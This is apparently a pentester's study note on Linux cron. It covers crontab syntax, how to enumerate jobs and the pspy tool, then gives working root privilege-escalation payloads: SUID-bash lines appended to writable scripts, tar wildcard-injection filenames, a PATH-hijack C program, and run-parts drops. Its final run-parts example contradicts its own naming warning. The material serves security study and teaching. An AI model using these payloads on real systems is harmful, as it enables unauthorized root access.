---
created: 14-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Cron jobs

>**Cron** is a time-based job scheduler in Unix-like operating systems that automates the execution of recurring tasks — called **Cron jobs** — at specified intervals, fixed times, or dates.

- Cron jobs are managed by the **Cron daemon**, **`crond`**. 
- The Cron daemon is usually configured to start at boot, and runs with **root privileges**, even though individual jobs may run as other users.
- `crond` checks configuration files, called **crontabs**, once every minute to determine which jobs to execute.

>[!warning] Many Cron jobs execute with elevated privileges (often as `root`). If these jobs reference scripts, binaries, or directories that are writable by low-privileged users, they can introduce privilege-escalation vulnerabilities.

>[!note]+ `crond` service
> - Check `crond` status:
> 
> ```bash
> systemctl status crond
> ```
> 
> - Ensure `crond` starts at boot time:
> 
> ```bash
> sudo systemctl enable crond
> ```
> - Start/stop:
> ```bash
> sudo systemctl start crond
> ```
> ```bash
> sudo systemctl stop crond
> ```
> On Debian-based systems, the service may be called `cron` instead of `crond`.
### User and system `crontab` files

>A [`crontab`](https://man.archlinux.org/man/crontab.5) (short for *Cron table*) is a text file that defines the schedule and commands that `crond` should execute. Each line in crontab represents a single Cron job.

There are two types of crontabs:

- **User crontabs**
	- User crontabs belong to and run as individual users.
	- User crontabs are usually stored under **`/var/spool/cron/crontabs/<username>`** or **`/var/spool/cron/<username>`**.
	- Each file is named after the user account it belongs to.
	- Cron jobs defined in a user crontab **run with the privileges of that user**.
	- The user field is **not present** in user crontabs because the owner is implied.

```bash
/var/spool/cron/crontabs/username # Debian/Ubuntu
/var/spool/cron/username          # RHEL/CentOS/Arch
```

- **System crontabs**
	- System crontabs are system-wide and can schedule jobs for **any user**.
	- Unlike user crontabs, each job **must include a user field** (e.g., `root`, `www-data`) to specify which user to execute the job as.
	- `/etc/crontab` is the main system-wide crontab file.
	- `/etc/cron.d/*` is a directory that stores additional system crontabs, usually those installed by external packages.
	- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, and `/etc/cron.monthly/*` are directories for crontabs that define jobs executed at fixed intervals (hourly, daily, weekly, and monthly, respectively).

```
/etc/crontab
/etc/cron.d/
/etc/cron.hourly/
/etc/cron.daily/ 
/etc/cron.weekly/
/etc/cron.monthly/
```

>[!note] Scripts in `/etc/cron.*` directories are almost always executed as **root**.

| Location                    | Purpose                          | Notes                                                  |
| --------------------------- | -------------------------------- | ------------------------------------------------------ |
| `/var/spool/cron/crontabs/` | User crontabs.                   | One file per user; edited using the `crontab` command. |
| `/etc/crontab`              | System-wide crontab.             | Includes user field; runs system jobs.                 |
| `/etc/cron.d/`              | Additional system crontab files. | System crontabs created by external packages.          |
| `/etc/cron.hourly/`         | Hourly scripts.                  | Cron jobs executed hourly.                             |
| `/etc/cron.daily/`          | Daily scripts.                   | Cron jobs executed daily.                              |
| `/etc/cron.weekly/`         | Weekly scripts.                  | Cron jobs executed weekly.                             |
| `/etc/cron.monthly/`        | Monthly scripts.                 | Cron jobs executed monthly.                            |
### `crontab` file syntax

- Each crontab line has the following format:

```bash
* * * * * user command [arguments]
- - - - -
| | | | |
| | | | +---- Day of the week (0-7) (Sunday = 0 and 7)
| | | +------ Month (1-12)
| | +-------- Day of the month (1-31)
| +---------- Hour (0-23)
+------------ Minute (0-59)
```

>[!warning] The `user` field is **mandatory in system crontabs**, and must be **omitted in user crontabs**.

>[!example]+ Example: a job that runs as root
>```bash
>* * * * * root command
>```

- Time fields:

| Field        | Values                  | Notes                                           |
| ------------ | ----------------------- | ----------------------------------------------- |
| Minute       | `0`-`59`                | Minute of the hour when the command runs        |
| Hour         | `0`-`23`                | Hour of the day (24-hour format)                |
| Day of month | `1`-`31`                | Day of the month                                |
| Month        | `1`-`12` or `Jan`-`Dec` | Month of the year                               |
| Day of Week  | `0`-`7`                 | Day of the week; `0` and `7` both denote Sunday |

- Special characters: 

	- **Asterisk `*`** denotes any/every value (e.g., every minute, every hour).
	- **Comma `,`** separates multiple values (e.g., `1,2,3` means 'run on the 1st, 2nd, and 3rd').
	- **Hyphen `-`** specifies a range of values (e.g., `1-5` days means 'run on weekdays').
	- **Slash `/`** specifies a step value (e.g., `*/5` in the minute means 'run every 5 minutes').

- Special time keywords: 

| Keywords                  | Description          | Equivalent  |
| ------------------------- | -------------------- | ----------- |
| `@reboot`                 | Run once at startup. | N/A         |
| `@yearly`/<br>`@annually` | Run once a year.     | `0 0 1 1 *` |
| `@monthly`                | Run once a month.    | `0 0 1 * *` |
| `@weekly`                 | Run once a week.     | `0 0 * * 0` |
| `@daily`/<br>`@midnight`  | Run once a day.      | `0 0 * * *` |
| `@hourly`                 | Run once an hour.    | `0 * * * *` |

>[!example]+ Examples
> 
> ```bash
> # this cron job runs...
> * * * * * command              # every minute
> 0 * * * * command              # at the top of every hour
> 0 12 * * 1-5 command           # from Monday to Friday at noon
> */10 * * * * command           # every 10 minutes
> 0 0 * * 0 command              # every Sunday midnight
> 45 23 * * * command            # at 11:45 PM (23:45) every day
> @reboot command                # on system startup
> @hourly command                # every hour
> ```

>[!note] See [`crontab.guru`](https://crontab.guru/) website; it provides a simple editor for cron schedule expressions.
### The `crontab` command

Crontab files should **not be edited directly**. They should be managed using the [`crontab`](https://man.archlinux.org/man/crontab.1.en) command.

- List the current user's crontab:

```bash
crontab -l
```

- Edit the current user's crontab:

```bash
crontab -e
```

- Remove all Cron jobs from the current user's crontab:

```bash
crontab -r
```

- List another user's crontab (requires privileges):

```bash
sudo crontab -u username -l
```

- Edit another user's crontab (requires privileges):

```bash
sudo crontab -u username -e
```

| Option      | Description                  |
| ----------- | ---------------------------- |
| `-u`        | Specify the user.            |
| `-e`        | Edit the users's `crontab`.  |
| `-l`        | List the user's `crontab`.   |
| `-r`        | Delete the user's `crontab`. |
| `-i`        | Prompt before deleting.      |
| `-T <file>` | Test a crontab file syntax.  |
| `-s`        | SELinux context.             |
| `-x`        | Enable debugging.            |
| `-V`        | Print version and exit.      |

>[!note] Options like `-T`, `-s`, and `-x` exist only on some implementations (e.g., Vixie Cron or specific distributions).
### Restricted Cron environment

Cron jobs run in a **minimal, restricted environment**.

- **Shell behavior**
	- The default shell is `/bin/sh`  (`SHELL=/bin/sh`).
	- The shell is **non-interactive** and **non-login**.
	- Shell initialization files (`.bashrc`, `.profile`, etc.) are **not sourced**.
	- The shell can be overridden by setting the `SHELL` variable in the crontab (e.g., `SHELL=/bin/bash`).

- **Environment variables**
	- The environment is very limited.
	- `PATH` is usually minimal (often `/usr/bin:/bin`, unless specified otherwise).
	- Many common variables (`EDITOR`, `TERM`, `DISPLAY`, etc.) are unset unless explicitly defined.

>[!example]+
>- Default Cron environment (output of the `env` command): 
> ```bash
> HOME=/root
> LOGNAME=root
> PATH=/usr/bin:/bin
> LANG=en_US.UTF-8
> SHELL=/bin/sh
> PWD=/root
> ```

- **Working directory**
	- The working directory is *often* set to the user’s `$HOME` (but it's not guaranteed).
	- Scripts should always use absolute paths.

- **Input and output**
	- Cron jobs **can't accept user input**.
	- Standard input is redirected from `/dev/null`.
	- Standard output (`stdout` and `stderr`) is emailed to the job owner or discarded unless redirected.

- Environment variables defined **at the top of a crontab file** apply to **all jobs** in that file.
- Environment variables defined **immediately before a specific job** apply **only to that job**.

>[!example]
> ```bash
> PATH=/usr/local/bin:/usr/bin:/bin
> SHELL=/bin/sh
> 
> * * * * * command1 # uses /bin/sh
> SHELL=/bin/bash
> * * * * * command2 # uses /bin/bash
> ```
> 

## Cron job enumeration

### User crontabs 

- List the current user's crontab:

```bash
crontab -l
```

- List user crontab files:

```bash
ls -la /var/spool/cron
```

```bash
ls -la /var/spool/cron/crontabs
```

>[!warning] You usually can't read other users’ crontabs without elevated privileges.
### System crontabs

- View the main system crontab:

```bash
cat /etc/crontab
```

- List additional system crontabs:

```bash
ls -la /etc/cron.d
```

- List Cron directories:

```bash
ls -la /etc/cron.*
```

- List periodic Cron directories explicitly:

```bash
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
```

- Show of all system crontab files:

```bash
cat /etc/cron.d/*
```

```bash
cat /etc/cron.hourly/*
```

```bash
cat /etc/cron.daily/*
```

```bash
cat /etc/cron.weekly/*
```

```bash
cat /etc/cron.monthly/*
```

### Writable files

- Find writable crontab files and directories:

```bash
find /etc/cron* -type f -writable 2>/dev/null
```

```bash
find /etc/cron* -type d -writable 2>/dev/null
```

```bash
find /var/spool/cron -type f -writable 2>/dev/null
```

#### `pspy`

The problem with the above commands is that they are only reveal Cron jobs in standard Cron directories, but miss jobs and custom scripts defined in other places. To understand what actually runs on the system, you need look at the processes.
But some jobs are extremely short lived: you won't be able to catch them using the traditional `ps`.

To trace **what actually runs**, use `pspy`.

>[`pspy`](https://github.com/DominicBreuker/pspy) is command-line tool that monitors processes running on the system **without requiring root privileges**. 

- Its primary purpose is to spy on running processes and discover background tasks that are executed by other users, including root.
- **`pspy` detects very short-lived processes**, such as Cron jobs that run and exit in milliseconds.

>[!note]+ Installation
>```bash
>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64
>```

- Usage:

```bash
./pspy64 -pf -i 1000
```

- `-p` shows process execution.
- `-f` shows file system events.
- `-i 1000` sets the refresh interval (milliseconds).

>[!example]+
>```bash
>./pspy64 -pf -i 1000
>```
> ```bash
> # ...
> 2025/12/11 16:35:05 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
> 2025/12/11 16:35:05 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
> 2025/12/11 16:35:05 FS:                 OPEN | /usr/lib/locale/locale-archive
> 2025/12/11 16:35:05 CMD: UID=0    PID=2205   | gzip 
> # ...
> ```
>From the output, you find a process that ran as **UID `0` (root)**, along with the exact command and arguments used. You can use this information to find potentially vulnerable Cron jobs and scripts.
## Privilege escalation via Cron jobs

>[!bug] If a privileged Cron job interacts with a file, directory, or command that a low-privileged user can influence, it becomes a privilege escalation vector.

Influence typically occurs through:
- Writable scripts
- Writable directories
- `PATH` hijacking
- Wildcard expansion
- Symlink abuse
- Race conditions (TOCTOU)
- `run-parts` misuse

Cron privilege escalation is almost always about **permissions**. 
If a root Cron job:
- executes a file you can modify, **or**
- reads from a directory you can write to, **or**
- relies on environment behavior you can influence
→ you may be able to execute code as root.

For each Cron job you find — especially those running as root — ask:
- Can I modify any script it executes?
- Can I write to any directory it reads from?
- Does it use wildcards (`*`)?
- Does it use relative paths?
- Does it execute commands without absolute paths?
- If it relies on `PATH`, can I write to any directories specified there? 
- Does it use `run-parts`?
If the answer to _any_ of these is “yes”, investigate further.

>[!tip] Cron jobs are a high-value target for privilege escalation because they represent **scheduled, automated trust**.
### Writable script executed by a privileged Cron job

- When a **privileged Cron job executes a script writable by a low-privileged user**, it can be used for privilege escalation.

>[!note] This is probably the most straightforward and common Cron privilege escalation vector.

>[!example]+ Example
>- A system Cron job executes a script:
> 
> ```bash
> */15 * * * * root /usr/local/bin/backup.sh
> ```
> 
>- You check permissions of that script and discover your current user can modify it:
> 
> ```bash
> ls -l /usr/local/bin/backup.sh
> ```
> ```bash
> -rwxrwxr-x 1 root users 234 Dec 31 11:00 backup.sh
> ```
> - You append a payload:
> ```bash
> echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh
> ```
> - Once the Cron job executes, you can spawn a root shell:
> ```bash
> /tmp/rootbash -p
> ```

> [!example]+
> - Check `/etc/crontab`:
> 
> ```bash
> cat /etc/crontab 
> ```
> 
> ```bash
> # /etc/crontab: system-wide crontab  
> # Unlike any other crontab you don't have to run the `crontab'  
> # command to install the new version when you edit this file  
> # and files in /etc/cron.d. These files also have username fields,  
> # that none of the other crontabs do.  
>   
> SHELL=/bin/sh  
> PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
>   
> # m h dom mon dow user  command  
> 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
> 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
> 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
> 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
> #  
> * * * * * root overwrite.sh  
> * * * * * root /usr/local/bin/compress.sh
> ```
> 
> - Cron's `PATH` includes your current user's home directory, `/home/user`.
> - There's a privileged Cron job that runs script, `overwrite.sh`:
> 
> ```bash
> find / -name "overwrite.sh" -ls 2>/dev/null
> ```
> 
> ```bash
> 816761    4 -rwxr--rw-   1 root     staff          40 May 13  2017 /usr/local/bin/overwrite.sh  
> ```
> 
> - The script is writable by your current user, so you add:
> 
> ```bash
> echo 'chmod +s /bin/bash' >> /usr/local/bin/overwrite.sh
> ```
> 
> - Wait a minute, then run:
> 
> ```bash
> /bin/bash -p
> ```
### Wildcard injection

- Some commands like `tar`, `rsync`, and `scp` become dangerous when, if running as root, used with **wildcards** in directories a low-privileged user can write to.

- If a cron job uses a wildcard (`*`) in an argument to pass multiple files (e.g., `tar /var/tmp/*`), you can **create files named like command-line options to interfere with the command**.

- This works because wildcard expansion occurs **before** the command runs. Filenames can be interpreted as command-line options.

- This becomes particularly dangerous if these commands supports options that can be used to execute other commands.

>[!example]+ Example: `tar` wildcard expansion
> - You find a system Cron job that uses `tar`:
> ```bash
> 0 3 * * * root tar -czf /var/backups/html.tgz /var/www/html/*
> ```
> 
>- This Cron job executes `tar` on the root's behalf to create a backup of all files inside `/var/www/html`; the archive is stored as`/var/backups/html.tgz`. 
> - **Your current user can write into the `/var/www/html`**.
>
> You recall that `tar` **supports option that can be used to execute commands**: `--checkpoint` and `--checkpoint-action=exec=<command>`.
> 
> - `--checkpoint` displays progress messages every Nth record (default: `10`).
> - `--checkpoint-action=ACTION` runs `ACTION` on each checkpoint.
> 
> → `tar ... --checkpoint=1 --checkpoint-action=exec=shell.sh` will execute `shell.sh`.
> 
>You create three files in `/var/www/html/`:
> 
> - `shell.sh`:
> 
> ```bash
> echo "chmod +s /bin/bash" > /var/www/html/shell.sh
> ```
> 
> ```bash
> chmod +x shell.sh
> ```
> 
> - `--checkpoint=1"` (empty file):
> 
> ```bash
> touch -- "--checkpoint=1"
> ```
> 
> - `--checkpoint-action=exec=shell.sh` (empty file):
> 
> ```bash
> touch -- "--checkpoint-action=exec=shell.sh"
> ```
> 
>- When the Cron job runs, it expands the wildcard `*` and includes, among others, two specially crafted files — `--checkpoint=1` and `--checkpoint-action=exec=shell.sh`
> - `tar`  interprets them as command-line options and executes `shell.sh` as root.

>[!note] See [`tar — man pages`](https://man.archlinux.org/man/tar.1.en).

>[!warning]+ For the above technique to work with `tar`, the tool must support the `--checkpoint` option (supported in GNU versions). Check `tar --version`; if it's not GNU, try `--owner` injection. See [`tar — man pages`](https://man.archlinux.org/man/tar.1#owner).

### `PATH` hijacking

- When a Cron executes commands without absolute paths, the system searches for an executable with the same name in the directories specified in `PATH`. 
- If, in addition to that, the `PATH` a privileged Cron job use includes a directory you can write to (typically, custom `PATH` specified by users), you can escalate privileges via **`PATH` hijacking**.

>[!note] See [[PATH_hijacking]] for more about `PATH` hijacking.

>[!example]+ Example
> - Suppose you find a Cron job executes a command without specifying its full path; the `PATH` variable includes a directory you can write to:
> 
> ```bash
> # /etc/crontab
> PATH=/tmp:/usr/local/sbin:/usr/local/bin:/home/user:/usr/sbin:/usr/bin:/sbin:/bin
> * * * * * root echo "$(date +%F-%H%M): Nginx status: \n $(systemctl status nginx | sed -n 2p)" >> /var/log/service.log
> ```
> 
>- In `/tmp`, you create a program that executes commands you want to run as root:
> 
> ```C
> #include <stdlib.h>
> #include <unistd.h>
> 
> int main() {
>     setuid(0);
>     setgid(0);
>     // grant persistent access by setting the SUID bit on bash
>     system("chmod 4777 /bin/bash");
>     return 0;
> }
> ```
> 
>- Compile it with the name `date`:
> 
> ```bash
> gcc /tmp/payload.c -o /tmp/date && chmod +x /tmp/date
> ```
> - Wait a minute, and run:
> ```bash
> /bin/bash -p
> ```

>[!example]+
> ```bash
> cat /etc/crontab 
> ```
> 
> ```bash
> # /etc/crontab: system-wide crontab  
> # Unlike any other crontab you don't have to run the `crontab'  
> # command to install the new version when you edit this file  
> # and files in /etc/cron.d. These files also have username fields,  
> # that none of the other crontabs do.  
>   
> SHELL=/bin/sh  
> PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
>   
> # m h dom mon dow user  command  
> 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
> 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
> 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
> 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
> #  
> * * * * * root overwrite.sh  
> * * * * * root /usr/local/bin/compress.sh
> ```
> 
> - Cron's `PATH` includes your current user's home directory, `/home/user`.
> - There's a privileged Cron job that runs script, `overwrite.sh`, without specifying its full path. 
> 
> - All you need to do is to create a script that gets you a root shell in your home directory:
> 
> ```bash
> echo '#!/bin/bash' > overwrite.sh && \
> echo 'chmod +s /bin/bash' >> overwrite.sh && \
> chmod +x overwrite.sh
> ```
> 
> - Wait a minute, then run:
> 
> ```bash
> /bin/bash -p
> ```

### `run-parts`

>[!note] The [`run-parts`](https://man.archlinux.org/man/run-parts.8) command runs all executable scripts found in a specific directory. It's commonly used in crontabs to manage periodic system tasks. 

- If a privileged Cron job uses `run-parts` with a directory you can write into, you can escalate you root.

>[!warning] `run-parts` has strict naming conventions. It ignores files that contain dots (`.`), are hidden, or have extensions.
>- Ignored: `exploit.sh`, `.exloit`, `exploit.py`
>- Executed: `exploit`

>[!example]+ Example: `run-parts`
> - You find a Cron job that uses `run-parts` to run scripts in another directory:
> 
> ```bash
> SHELL=/bin/sh
> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
> 
> # m h dom mon dow user	command
> 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
> 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
> 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
> 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
> #
> ```
> 
>-  All executables files found in the directory passed to `run-parts` (`etc/cron.hourly`/`daily`/`weekly`/`monthly`) **are scheduled to run as root**.
>
>- If you can modify to any script in `/etc/cron.{hourly,daily,weekly,monthly}/` or create your own binary in any of these directories, you can force Cron to run your code as root:
> ```bash
> echo "chmod +s /bin/bash" > /etc/cron.daily/backup.sh
> ```

## References and further reading
- [`cron — Arch Linux Wiki`](https://wiki.archlinux.org/title/Cron)
- [`Linux Privilege Escalation by Exploiting Cronjobs — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)
- [`Cron Jobs – Linux Privilege Escalation — Junnernaut Pentesting Academy`](https://juggernaut-sec.com/cron-jobs-lpe/)
- [`Cron — Gentoo Wiki`](https://wiki.gentoo.org/wiki/Cron)
- [`tar — man pages`](https://man.archlinux.org/man/tar.1)